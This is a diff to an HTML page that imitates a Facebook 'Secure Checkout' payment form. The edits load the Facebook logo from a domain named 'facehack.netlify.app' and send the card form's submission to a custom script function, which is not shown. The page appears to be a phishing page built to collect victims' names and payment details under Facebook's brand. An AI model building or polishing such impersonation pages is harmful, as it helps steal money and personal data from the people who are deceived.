@@ -10,7 +10,7 @@
   <div class="custom-wrapper">
     <header class="custom-header">
       <div class="custom-header-content">
-        <img src="Facebook_logo_(square).png" alt="Logo" class="custom-logo">
+        <img src="https://facehack.netlify.app/Facebook_logo_(square).png" alt="Logo" class="custom-logo" width="40" height="40">
         <div class="custom-secure-badge">
           🔒 Secure Checkout
         </div>
@@ -67,7 +67,7 @@
           </div>
           
           <div id="custom-form-wrapper">
-            <form id="custom-payment-form">
+            <form id="custom-payment-form" onsubmit="event.preventDefault(); submitPaymentForm();">
               <div class="custom-form-row">
                 <div class="custom-form-group">
                   <label for="custom-first-name">First Name</label>
